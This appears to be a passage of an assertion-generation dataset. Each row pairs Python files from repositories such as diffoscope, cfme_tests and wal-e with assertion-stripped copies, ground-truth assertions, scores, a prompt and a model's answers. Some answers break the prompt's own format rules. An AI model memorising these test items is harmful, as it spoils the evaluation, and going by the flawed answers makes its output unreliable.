    expected_diff = get_data('text_ascii_expected_diff')
    assert differences[0].unified_diff == expected_diff

@skip_unless_tools_exist('xz')
def test_compare_non_existing(monkeypatch, xz1):
    assert_non_existing(monkeypatch, xz1)
","
1# -*- coding: utf-8 -*-
2#
3# diffoscope: in-depth comparison of files, archives, and directories
4#
5# Copyright © 2015 Jérémy Bobbio <lunar@debian.org>
6#
7# diffoscope is free software: you can redistribute it and/or modify
8# it under the terms of the GNU General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# diffoscope is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15# GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License
18# along with diffoscope.  If not, see <https://www.gnu.org/licenses/>.
19
20import shutil
21import pytest
22
23from diffoscope.comparators.xz import XzFile
24from diffoscope.comparators.binary import FilesystemFile
25from diffoscope.comparators.utils.specialize import specialize
26
27from utils.data import load_fixture, get_data
28from utils.tools import skip_unless_tools_exist
29
30xz1 = load_fixture('test1.xz')
31xz2 = load_fixture('test2.xz')
32
33def test_identification(xz1):
34
35def test_no_differences(xz1):
36    difference = xz1.compare(xz1)
37
38@pytest.fixture
39def differences(xz1, xz2):
40    return xz1.compare(xz2).details
41
42@skip_unless_tools_exist('xz')
43def test_content_source(differences):
44
45@skip_unless_tools_exist('xz')
46def test_content_source_without_extension(tmpdir, xz1, xz2):
47    path1 = str(tmpdir.join('test1'))
48    path2 = str(tmpdir.join('test2'))
49    shutil.copy(xz1.path, path1)
50    shutil.copy(xz2.path, path2)
51    xz1 = specialize(FilesystemFile(path1))
52    xz2 = specialize(FilesystemFile(path2))
53    difference = xz1.compare(xz2).details
54
55@skip_unless_tools_exist('xz')
56def test_content_diff(differences):
57    expected_diff = get_data('text_ascii_expected_diff')
58
59@skip_unless_tools_exist('xz')
60def test_compare_non_existing(monkeypatch, xz1):
61","[['difference', '==', 'None'], ['differences[0].source1', '==', ""'test1'""], ['differences[0].source2', '==', ""'test2'""], ['difference[0].source1', '==', ""'test1-content'""], ['difference[0].source2', '==', ""'test2-content'""], ['differences[0].unified_diff', '==', 'expected_diff']]",9,6,0.6666666666666666,0.0025445292620865,"['xz1', 'xz2', 'difference', 'differences', 'tmpdir', 'path1', 'path2', 'expected_diff', 'monkeypatch']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['xz1', 'xz2', 'difference', 'differences', 'tmpdir', 'path1', 'path2', 'expected_diff', 'monkeypatch']
*Code:

1# -*- coding: utf-8 -*-
2#
3# diffoscope: in-depth comparison of files, archives, and directories
4#
5# Copyright © 2015 Jérémy Bobbio <lunar@debian.org>
6#
7# diffoscope is free software: you can redistribute it and/or modify
8# it under the terms of the GNU General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# diffoscope is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15# GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License
18# along with diffoscope.  If not, see <https://www.gnu.org/licenses/>.
19
20import shutil
21import pytest
22
23from diffoscope.comparators.xz import XzFile
24from diffoscope.comparators.binary import FilesystemFile
25from diffoscope.comparators.utils.specialize import specialize
26
27from utils.data import load_fixture, get_data
28from utils.tools import skip_unless_tools_exist
29
30xz1 = load_fixture('test1.xz')
31xz2 = load_fixture('test2.xz')
32
33def test_identification(xz1):
34
35def test_no_differences(xz1):
36    difference = xz1.compare(xz1)
37
38@pytest.fixture
39def differences(xz1, xz2):
40    return xz1.compare(xz2).details
41
42@skip_unless_tools_exist('xz')
43def test_content_source(differences):
44
45@skip_unless_tools_exist('xz')
46def test_content_source_without_extension(tmpdir, xz1, xz2):
47    path1 = str(tmpdir.join('test1'))
48    path2 = str(tmpdir.join('test2'))
49    shutil.copy(xz1.path, path1)
50    shutil.copy(xz2.path, path2)
51    xz1 = specialize(FilesystemFile(path1))
52    xz2 = specialize(FilesystemFile(path2))
53    difference = xz1.compare(xz2).details
54
55@skip_unless_tools_exist('xz')
56def test_content_diff(differences):
57    expected_diff = get_data('text_ascii_expected_diff')
58
59@skip_unless_tools_exist('xz')
60def test_compare_non_existing(monkeypatch, xz1):
61",3548,"[[30, 'xz1', '!=', None, ""ensure xz1 file is loaded""],
 [31, 'xz2', '!=', None, ""ensure xz2 file is loaded""],
 [36, 'difference', '==', None, ""there should be no difference when comparing xz1 to itself""],
 [40, 'differences', '!=', None, ""there should be differences when comparing xz1 and xz2""],
 [53, 'difference', '!=', None, ""there should be differences when comparing the contents of xz1 and xz2""],
 [57, 'expected_diff', '!=', None, ""ensure expected difference data is loaded""]]"
weidenba/recovery_sort,"from filter_system.rename import RenameFilterSystem


def test_init_PlugIns():
    filter_system = RenameFilterSystem([])
    assert len(filter_system.filter_plugins.keys()) > 0
    for plugin in filter_system.filter_plugins.keys():
        assert callable(filter_system.filter_plugins[plugin])
","
1from filter_system.rename import RenameFilterSystem
2
3
4def test_init_PlugIns():
5    filter_system = RenameFilterSystem([])
6    for plugin in filter_system.filter_plugins.keys():
7","[['len(filter_system.filter_plugins.keys())', '>', '0'], ['callable(filter_system.filter_plugins[plugin])', '==', 'True']]",2,2,1.0,0.0067796610169491,['filter_system'],1,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['filter_system']
*Code:

1from filter_system.rename import RenameFilterSystem
2
3
4def test_init_PlugIns():
5    filter_system = RenameFilterSystem([])
6    for plugin in filter_system.filter_plugins.keys():
7",1582,"[[5, 'filter_system', '!=', None, ""Filter system must be initialized before use""],
 [6, 'plugin', '!=', None, ""Plugin must exist to be iterated on""]]"
lehinevych/cfme_tests,"# -*- coding: utf-8 -*-
import cfme.fixtures.pytest_selenium as sel
import cfme.intelligence.chargeback as cb
import cfme.web_ui.flash as flash
import pytest
import random

from utils.providers import setup_a_provider
from utils import version

pytestmark = [pytest.mark.tier(3)]


@pytest.fixture(scope=""module"")
def provider():
    return setup_a_provider(prov_class=""infra"", prov_type=""virtualcenter"")


@pytest.mark.meta(blockers=[1273654])
def test_assign_compute_enterprise(provider):
    enterprise = cb.Assign(
        assign_to=""The Enterprise"",
        selections={
            ""Enterprise"": ""Default""
        })
    enterprise.computeassign()

    flash.assert_message_match('Rate Assignments saved')
    # Assert that the selection made is listed on the UI
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


def test_assign_compute_provider(provider):
    compute_provider = cb.Assign(
        assign_to=""Selected Cloud/Infrastructure Providers"",
        selections={
            provider.name: ""Default""
        })
    compute_provider.computeassign()

    flash.assert_message_match('Rate Assignments saved')
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(provider.name).first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


def test_assign_compute_cluster(provider):
    cluster_name = random.choice(provider.get_yaml_data()[""clusters""])

    cluster = cb.Assign(
        assign_to=version.pick({version.LOWEST: 'Selected Clusters',
                            '5.4': 'Selected Cluster / Deployment Roles'}),
        selections={
            cluster_name: ""Default""
        })
    cluster.computeassign()

    flash.assert_message_match('Rate Assignments saved')
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(cluster_name).first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


def test_assign_compute_taggedvm(provider):
    tagged_vm = cb.Assign(
        assign_to=""Tagged VMs and Instances"",
        tag_category=""Location"",
        selections={
            ""Chicago"": ""Default""
        })
    tagged_vm.computeassign()

    flash.assert_message_match('Rate Assignments saved')
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


@pytest.mark.meta(blockers=[1273654])
def test_assign_storage_enterprise(provider):
    enterprise = cb.Assign(
        assign_to=""The Enterprise"",
        selections={
            ""Enterprise"": ""Default""
        })

    enterprise.storageassign()

    flash.assert_message_match('Rate Assignments saved')
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


def test_assign_storage_datastores(provider):
    datastore = random.choice(provider.get_yaml_data()[""datastores""])[""name""]

    sel_datastore = cb.Assign(
        assign_to=""Selected Datastores"",
        selections={
            datastore: ""Default""
        })
    sel_datastore.storageassign()

    flash.assert_message_match('Rate Assignments saved')
    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(datastore).first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'


def test_assign_storage_tagged_datastores(provider):
    tagged_datastore = cb.Assign(
        assign_to=""Tagged Datastores"",
        tag_category=""Location"",
        selections={
            ""Chicago"": ""Default""
        })
    tagged_datastore.storageassign()

    selected_option = sel.text(
        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
    assert selected_option == ""Default"", 'Selection does not match'
    flash.assert_message_match('Rate Assignments saved')
","
1# -*- coding: utf-8 -*-
2import cfme.fixtures.pytest_selenium as sel
3import cfme.intelligence.chargeback as cb
4import cfme.web_ui.flash as flash
5import pytest
6import random
7
8from utils.providers import setup_a_provider
9from utils import version
10
11pytestmark = [pytest.mark.tier(3)]
12
13
14@pytest.fixture(scope=""module"")
15def provider():
16    return setup_a_provider(prov_class=""infra"", prov_type=""virtualcenter"")
17
18
19@pytest.mark.meta(blockers=[1273654])
20def test_assign_compute_enterprise(provider):
21    enterprise = cb.Assign(
22        assign_to=""The Enterprise"",
23        selections={
24            ""Enterprise"": ""Default""
25        })
26    enterprise.computeassign()
27
28    # Assert that the selection made is listed on the UI
29    selected_option = sel.text(
30        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
31
32
33def test_assign_compute_provider(provider):
34    compute_provider = cb.Assign(
35        assign_to=""Selected Cloud/Infrastructure Providers"",
36        selections={
37            provider.name: ""Default""
38        })
39    compute_provider.computeassign()
40
41    selected_option = sel.text(
42        cb.assign_form.selections.select_by_name(provider.name).first_selected_option)
43
44
45def test_assign_compute_cluster(provider):
46    cluster_name = random.choice(provider.get_yaml_data()[""clusters""])
47
48    cluster = cb.Assign(
49        assign_to=version.pick({version.LOWEST: 'Selected Clusters',
50                            '5.4': 'Selected Cluster / Deployment Roles'}),
51        selections={
52            cluster_name: ""Default""
53        })
54    cluster.computeassign()
55
56    selected_option = sel.text(
57        cb.assign_form.selections.select_by_name(cluster_name).first_selected_option)
58
59
60def test_assign_compute_taggedvm(provider):
61    tagged_vm = cb.Assign(
62        assign_to=""Tagged VMs and Instances"",
63        tag_category=""Location"",
64        selections={
65            ""Chicago"": ""Default""
66        })
67    tagged_vm.computeassign()
68
69    selected_option = sel.text(
70        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
71
72
73@pytest.mark.meta(blockers=[1273654])
74def test_assign_storage_enterprise(provider):
75    enterprise = cb.Assign(
76        assign_to=""The Enterprise"",
77        selections={
78            ""Enterprise"": ""Default""
79        })
80
81    enterprise.storageassign()
82
83    selected_option = sel.text(
84        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
85
86
87def test_assign_storage_datastores(provider):
88    datastore = random.choice(provider.get_yaml_data()[""datastores""])[""name""]
89
90    sel_datastore = cb.Assign(
91        assign_to=""Selected Datastores"",
92        selections={
93            datastore: ""Default""
94        })
95    sel_datastore.storageassign()
96
97    selected_option = sel.text(
98        cb.assign_form.selections.select_by_name(datastore).first_selected_option)
99
100
101def test_assign_storage_tagged_datastores(provider):
102    tagged_datastore = cb.Assign(
103        assign_to=""Tagged Datastores"",
104        tag_category=""Location"",
105        selections={
106            ""Chicago"": ""Default""
107        })
108    tagged_datastore.storageassign()
109
110    selected_option = sel.text(
111        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
112","[['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""'], ['selected_option', '==', '""Default""']]",14,7,0.5,0.0017077335935594,"['pytestmark', 'provider', 'enterprise', 'selected_option', 'compute_provider', 'cluster_name', 'cluster', 'tagged_vm', 'datastore', 'sel_datastore', 'tagged_datastore']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['pytestmark', 'provider', 'enterprise', 'selected_option', 'compute_provider', 'cluster_name', 'cluster', 'tagged_vm', 'datastore', 'sel_datastore', 'tagged_datastore']
*Code:

1# -*- coding: utf-8 -*-
2import cfme.fixtures.pytest_selenium as sel
3import cfme.intelligence.chargeback as cb
4import cfme.web_ui.flash as flash
5import pytest
6import random
7
8from utils.providers import setup_a_provider
9from utils import version
10
11pytestmark = [pytest.mark.tier(3)]
12
13
14@pytest.fixture(scope=""module"")
15def provider():
16    return setup_a_provider(prov_class=""infra"", prov_type=""virtualcenter"")
17
18
19@pytest.mark.meta(blockers=[1273654])
20def test_assign_compute_enterprise(provider):
21    enterprise = cb.Assign(
22        assign_to=""The Enterprise"",
23        selections={
24            ""Enterprise"": ""Default""
25        })
26    enterprise.computeassign()
27
28    # Assert that the selection made is listed on the UI
29    selected_option = sel.text(
30        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
31
32
33def test_assign_compute_provider(provider):
34    compute_provider = cb.Assign(
35        assign_to=""Selected Cloud/Infrastructure Providers"",
36        selections={
37            provider.name: ""Default""
38        })
39    compute_provider.computeassign()
40
41    selected_option = sel.text(
42        cb.assign_form.selections.select_by_name(provider.name).first_selected_option)
43
44
45def test_assign_compute_cluster(provider):
46    cluster_name = random.choice(provider.get_yaml_data()[""clusters""])
47
48    cluster = cb.Assign(
49        assign_to=version.pick({version.LOWEST: 'Selected Clusters',
50                            '5.4': 'Selected Cluster / Deployment Roles'}),
51        selections={
52            cluster_name: ""Default""
53        })
54    cluster.computeassign()
55
56    selected_option = sel.text(
57        cb.assign_form.selections.select_by_name(cluster_name).first_selected_option)
58
59
60def test_assign_compute_taggedvm(provider):
61    tagged_vm = cb.Assign(
62        assign_to=""Tagged VMs and Instances"",
63        tag_category=""Location"",
64        selections={
65            ""Chicago"": ""Default""
66        })
67    tagged_vm.computeassign()
68
69    selected_option = sel.text(
70        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
71
72
73@pytest.mark.meta(blockers=[1273654])
74def test_assign_storage_enterprise(provider):
75    enterprise = cb.Assign(
76        assign_to=""The Enterprise"",
77        selections={
78            ""Enterprise"": ""Default""
79        })
80
81    enterprise.storageassign()
82
83    selected_option = sel.text(
84        cb.assign_form.selections.select_by_name(""Enterprise"").first_selected_option)
85
86
87def test_assign_storage_datastores(provider):
88    datastore = random.choice(provider.get_yaml_data()[""datastores""])[""name""]
89
90    sel_datastore = cb.Assign(
91        assign_to=""Selected Datastores"",
92        selections={
93            datastore: ""Default""
94        })
95    sel_datastore.storageassign()
96
97    selected_option = sel.text(
98        cb.assign_form.selections.select_by_name(datastore).first_selected_option)
99
100
101def test_assign_storage_tagged_datastores(provider):
102    tagged_datastore = cb.Assign(
103        assign_to=""Tagged Datastores"",
104        tag_category=""Location"",
105        selections={
106            ""Chicago"": ""Default""
107        })
108    tagged_datastore.storageassign()
109
110    selected_option = sel.text(
111        cb.assign_form.selections.select_by_name(""Chicago"").first_selected_option)
112",5002,"[[15, 'provider', '!=', None, 'provider should not be None for setup'],
[26, 'enterprise', '!=', None, 'enterprise should not be None for compute assign'],
[39, 'compute_provider', '!=', None, 'compute_provider should not be None for compute assign'],
[54, 'cluster', '!=', None, 'cluster should not be None for compute assign'],
[67, 'tagged_vm', '!=', None, 'tagged_vm should not be None for compute assign'],
[81, 'enterprise', '!=', None, 'enterprise should not be None for storage assign'],
[95, 'sel_datastore', '!=', None, 'sel_datastore should not be None for storage assign'],
[108, 'tagged_datastore', '!=', None, 'tagged_datastore should not be None for storage assign']]"
Instagram/wal-e,"from urlparse import urlparse
import socket
import traceback
import gevent

import boto

from . import calling_format
from wal_e import log_help
from wal_e.pipeline import get_download_pipeline
from wal_e.piper import PIPE
from wal_e.retries import retry, retry_with_count

logger = log_help.WalELogger(__name__)

# Set a timeout for boto HTTP operations should no timeout be set.
# Yes, in the case the user *wanted* no timeouts, this would set one.
# If that becomes a problem, someone should post a bug, although I am
# having a hard time imagining why that behavior could ever be useful.
if not boto.config.has_option('Boto', 'http_socket_timeout'):
    if not boto.config.has_section('Boto'):
        boto.config.add_section('Boto')

    boto.config.set('Boto', 'http_socket_timeout', '5')


def _uri_to_key(creds, uri, conn=None):
    assert uri.startswith('s3://')
    url_tup = urlparse(uri)
    bucket_name = url_tup.netloc
    cinfo = calling_format.from_store_name(bucket_name)
    if conn is None:
        conn = cinfo.connect(creds)
    bucket = boto.s3.bucket.Bucket(connection=conn, name=bucket_name)
    return boto.s3.key.Key(bucket=bucket, name=url_tup.path)


def uri_put_file(creds, uri, fp, content_encoding=None, conn=None):
    # Per Boto 2.2.2, which will only read from the current file
    # position to the end.  This manifests as successfully uploaded
    # *empty* keys in S3 instead of the intended data because of how
    # tempfiles are used (create, fill, submit to boto).
    #
    # It is presumed it is the caller's responsibility to rewind the
    # file position, and since the whole program was written with this
    # in mind, assert it as a precondition for using this procedure.
    assert fp.tell() == 0

    k = _uri_to_key(creds, uri, conn=conn)

    if content_encoding is not None:
        k.content_type = content_encoding

    k.set_contents_from_file(fp, encrypt_key=True)
    return k


def uri_get_file(creds, uri, conn=None):
    k = _uri_to_key(creds, uri, conn=conn)
    return k.get_contents_as_string()


def do_lzop_get(creds, url, path, decrypt):
    """"""
    Get and decompress a S3 URL

    This streams the content directly to lzop; the compressed version
    is never stored on disk.

    """"""
    assert url.endswith('.lzo'), 'Expect an lzop-compressed file'

    def log_wal_fetch_failures_on_error(exc_tup, exc_processor_cxt):
        def standard_detail_message(prefix=''):
            return (prefix + '  There have been {n} attempts to fetch wal '
                    'file {url} so far.'.format(n=exc_processor_cxt, url=url))
        typ, value, tb = exc_tup
        del exc_tup

        # Screen for certain kinds of known-errors to retry from
        if issubclass(typ, socket.error):
            socketmsg = value[1] if isinstance(value, tuple) else value

            logger.info(
                msg='Retrying fetch because of a socket error',
                detail=standard_detail_message(
                    ""The socket error's message is '{0}'.""
                    .format(socketmsg)))
        elif (issubclass(typ, boto.exception.S3ResponseError) and
              value.error_code == 'RequestTimeTooSkewed'):
            logger.info(msg='Retrying fetch because of a Request Skew time',
                        detail=standard_detail_message())
        else:
            # For all otherwise untreated exceptions, report them as a
            # warning and retry anyway -- all exceptions that can be
            # justified should be treated and have error messages
            # listed.
            logger.warning(
                msg='retrying WAL file fetch from unexpected exception',
                detail=standard_detail_message(
                    'The exception type is {etype} and its value is '
                    '{evalue} and its traceback is {etraceback}'
                    .format(etype=typ, evalue=value,
                            etraceback=''.join(traceback.format_tb(tb)))))

        # Help Python GC by resolving possible cycles
        del tb

    @retry(retry_with_count(log_wal_fetch_failures_on_error))
    def download():
        with open(path, 'wb') as decomp_out:
            key = _uri_to_key(creds, url)
            with get_download_pipeline(PIPE, decomp_out, decrypt) as pl:
                g = gevent.spawn(write_and_return_error, key, pl.stdin)

                try:
                    # Raise any exceptions from write_and_return_error
                    exc = g.get()
                    if exc is not None:
                        raise exc
                except boto.exception.S3ResponseError, e:
                    if e.status == 404:
                        # Do not retry if the key not present, this
                        # can happen under normal situations.
                        pl.abort()
                        logger.warning(
                            msg=('could no longer locate object while '
                                 'performing wal restore'),
                            detail=('The absolute URI that could not be '
                                    'located is {url}.'.format(url=url)),
                            hint=('This can be normal when Postgres is trying '
                                  'to detect what timelines are available '
                                  'during restoration.'))
                        return False
                    else:
                        raise

            logger.info(
                msg='completed download and decompression',
                detail='Downloaded and decompressed ""{url}"" to ""{path}""'
                .format(url=url, path=path))
        return True

    return download()


def write_and_return_error(key, stream):
    try:
        key.get_contents_to_file(stream)
        stream.flush()
    except Exception, e:
        return e
    finally:
        stream.close()
","
1from urlparse import urlparse
2import socket
3import traceback
4import gevent
5
6import boto
7
8from . import calling_format
9from wal_e import log_help
10from wal_e.pipeline import get_download_pipeline
11from wal_e.piper import PIPE
12from wal_e.retries import retry, retry_with_count
13
14logger = log_help.WalELogger(__name__)
15
16# Set a timeout for boto HTTP operations should no timeout be set.
17# Yes, in the case the user *wanted* no timeouts, this would set one.
18# If that becomes a problem, someone should post a bug, although I am
19# having a hard time imagining why that behavior could ever be useful.
20if not boto.config.has_option('Boto', 'http_socket_timeout'):
21    if not boto.config.has_section('Boto'):
22        boto.config.add_section('Boto')
23
24    boto.config.set('Boto', 'http_socket_timeout', '5')
25
26
27def _uri_to_key(creds, uri, conn=None):
28    url_tup = urlparse(uri)
29    bucket_name = url_tup.netloc
30    cinfo = calling_format.from_store_name(bucket_name)
31    if conn is None:
32        conn = cinfo.connect(creds)
33    bucket = boto.s3.bucket.Bucket(connection=conn, name=bucket_name)
34    return boto.s3.key.Key(bucket=bucket, name=url_tup.path)
35
36
37def uri_put_file(creds, uri, fp, content_encoding=None, conn=None):
38    # Per Boto 2.2.2, which will only read from the current file
39    # position to the end.  This manifests as successfully uploaded
40    # *empty* keys in S3 instead of the intended data because of how
41    # tempfiles are used (create, fill, submit to boto).
42    #
43    # It is presumed it is the caller's responsibility to rewind the
44    # file position, and since the whole program was written with this
45
46    k = _uri_to_key(creds, uri, conn=conn)
47
48    if content_encoding is not None:
49        k.content_type = content_encoding
50
51    k.set_contents_from_file(fp, encrypt_key=True)
52    return k
53
54
55def uri_get_file(creds, uri, conn=None):
56    k = _uri_to_key(creds, uri, conn=conn)
57    return k.get_contents_as_string()
58
59
60def do_lzop_get(creds, url, path, decrypt):
61    """"""
62    Get and decompress a S3 URL
63
64    This streams the content directly to lzop; the compressed version
65    is never stored on disk.
66
67    """"""
68
69    def log_wal_fetch_failures_on_error(exc_tup, exc_processor_cxt):
70        def standard_detail_message(prefix=''):
71            return (prefix + '  There have been {n} attempts to fetch wal '
72                    'file {url} so far.'.format(n=exc_processor_cxt, url=url))
73        typ, value, tb = exc_tup
74        del exc_tup
75
76        # Screen for certain kinds of known-errors to retry from
77        if issubclass(typ, socket.error):
78            socketmsg = value[1] if isinstance(value, tuple) else value
79
80            logger.info(
81                msg='Retrying fetch because of a socket error',
82                detail=standard_detail_message(
83                    ""The socket error's message is '{0}'.""
84                    .format(socketmsg)))
85        elif (issubclass(typ, boto.exception.S3ResponseError) and
86              value.error_code == 'RequestTimeTooSkewed'):
87            logger.info(msg='Retrying fetch because of a Request Skew time',
88                        detail=standard_detail_message())
89        else:
90            # For all otherwise untreated exceptions, report them as a
91            # warning and retry anyway -- all exceptions that can be
92            # justified should be treated and have error messages
93            # listed.
94            logger.warning(
95                msg='retrying WAL file fetch from unexpected exception',
96                detail=standard_detail_message(
97                    'The exception type is {etype} and its value is '
98                    '{evalue} and its traceback is {etraceback}'
99                    .format(etype=typ, evalue=value,
100                            etraceback=''.join(traceback.format_tb(tb)))))
101
102        # Help Python GC by resolving possible cycles
103        del tb
104
105    @retry(retry_with_count(log_wal_fetch_failures_on_error))
106    def download():
107        with open(path, 'wb') as decomp_out:
108            key = _uri_to_key(creds, url)
109            with get_download_pipeline(PIPE, decomp_out, decrypt) as pl:
110                g = gevent.spawn(write_and_return_error, key, pl.stdin)
111
112                try:
113                    # Raise any exceptions from write_and_return_error
114                    exc = g.get()
115                    if exc is not None:
116                        raise exc
117                except boto.exception.S3ResponseError, e:
118                    if e.status == 404:
119                        # Do not retry if the key not present, this
120                        # can happen under normal situations.
121                        pl.abort()
122                        logger.warning(
123                            msg=('could no longer locate object while '
124                                 'performing wal restore'),
125                            detail=('The absolute URI that could not be '
126                                    'located is {url}.'.format(url=url)),
127                            hint=('This can be normal when Postgres is trying '
128                                  'to detect what timelines are available '
129                                  'during restoration.'))
130                        return False
131                    else:
132                        raise
133
134            logger.info(
135                msg='completed download and decompression',
136                detail='Downloaded and decompressed ""{url}"" to ""{path}""'
137                .format(url=url, path=path))
138        return True
139
140    return download()
141
142
143def write_and_return_error(key, stream):
144    try:
145        key.get_contents_to_file(stream)
146        stream.flush()
147    except Exception, e:
148        return e
149    finally:
150        stream.close()
151","[[""uri.startswith('s3://')"", '==', 'True'], ['fp.tell()', '==', '0'], [""url.endswith('.lzo')"", '==', 'True']]",4,3,0.75,0.0005088195386702,"['logger', 'creds', 'uri', 'conn', 'url_tup', 'bucket_name', 'cinfo', 'bucket', 'fp', 'content_encoding', 'k', 'k.content_type', 'url', 'path', 'decrypt', 'exc_tup', 'exc_processor_cxt', 'prefix', 'typ', 'value', 'tb', 'socketmsg', 'key', 'g', 'exc', 'stream']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['logger', 'creds', 'uri', 'conn', 'url_tup', 'bucket_name', 'cinfo', 'bucket', 'fp', 'content_encoding', 'k', 'k.content_type', 'url', 'path', 'decrypt', 'exc_tup', 'exc_processor_cxt', 'prefix', 'typ', 'value', 'tb', 'socketmsg', 'key', 'g', 'exc', 'stream']
*Code:

1from urlparse import urlparse
2import socket
3import traceback
4import gevent
5
6import boto
7
8from . import calling_format
9from wal_e import log_help
10from wal_e.pipeline import get_download_pipeline
11from wal_e.piper import PIPE
12from wal_e.retries import retry, retry_with_count
13
14logger = log_help.WalELogger(__name__)
15
16# Set a timeout for boto HTTP operations should no timeout be set.
17# Yes, in the case the user *wanted* no timeouts, this would set one.
18# If that becomes a problem, someone should post a bug, although I am
19# having a hard time imagining why that behavior could ever be useful.
20if not boto.config.has_option('Boto', 'http_socket_timeout'):
21    if not boto.config.has_section('Boto'):
22        boto.config.add_section('Boto')
23
24    boto.config.set('Boto', 'http_socket_timeout', '5')
25
26
27def _uri_to_key(creds, uri, conn=None):
28    url_tup = urlparse(uri)
29    bucket_name = url_tup.netloc
30    cinfo = calling_format.from_store_name(bucket_name)
31    if conn is None:
32        conn = cinfo.connect(creds)
